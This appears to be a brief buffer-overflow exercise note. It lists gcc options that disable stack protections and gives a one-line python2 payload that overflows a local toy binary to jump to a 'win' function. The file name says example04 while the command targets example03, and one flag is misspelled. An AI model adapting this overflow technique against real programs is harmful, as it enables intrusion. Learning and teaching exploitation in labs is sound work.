# SOURCE CODE : bof_example04.c

```
[+]Compile Option
: gcc -m32 -o {} {} -mpreferred-stack-boundary=2 -z execstac -no-pie -fno-stack-protector -static 

[+]Exploit
python2 -c "print 'a'*72 + {win function address}" | ./bof_example03

```